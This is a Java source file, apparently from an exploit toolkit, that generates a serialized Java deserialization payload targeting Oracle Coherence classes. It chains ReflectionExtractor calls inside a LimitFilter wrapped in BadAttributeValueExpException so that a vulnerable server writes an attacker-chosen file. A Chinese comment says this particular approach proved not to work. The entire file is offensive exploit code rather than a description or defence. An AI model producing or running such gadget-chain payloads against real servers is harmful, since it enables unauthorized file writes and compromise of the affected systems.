package com.feihong.payload;

import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/*
    尝试的一个思路，但是事实证明行不通
 */

public class FileWritePayload {
    public static byte[] generate(String fileName, String content) throws Exception {
        byte[] payload = content.getBytes();

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[]{String.class}}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[]{fileName}}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "write",
                new Object[]{payload}
        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                extractor1,
                extractor2,
                extractor3
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, FileOutputStream.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        return Util.serialize(badAttributeValueExpException);
    }
}
